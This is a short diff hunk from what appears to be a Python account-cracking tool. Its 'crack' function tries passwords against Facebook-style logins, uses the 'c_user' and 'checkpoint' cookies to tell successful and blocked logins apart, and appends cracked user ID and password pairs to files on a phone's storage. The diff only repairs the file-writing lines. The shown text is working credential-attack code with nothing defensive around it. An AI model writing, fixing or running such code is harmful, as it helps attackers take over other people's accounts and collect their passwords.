@@ -130,12 +130,12 @@ def crack(uid,pwx,count):
             geta=session.cookies.get_dict().keys()
             if 'c_user' in geta:
                 print(f"\r\033[1;31m[\x1b[38;5;48mTan-ok\033[1;31m]\x1b[38;5;48m {uid} \033[1;37m┼\x1b[38;5;48m {key}")
-                open('\sdcard\Tan-oks.txt','a').write(+uid+' | '+key+)
+                open('\sdcard\Tan-oks.txt','a').write(+uid+' | '+key+'\n')
                 oks.append(uid)
                 break
             elif 'checkpoint' in geta:
                 print(f"\r\033[1;31m[Tan-cp] {uid} ┼ {key}")
-                open('\sdcard\Tan-cps.txt','a').write(+uid+' | '+key+)
+                open('\sdcard\Tan-cps.txt','a').write(+uid+' | '+key+'\n')
                 cps.append(uid)
                 break            
             else:
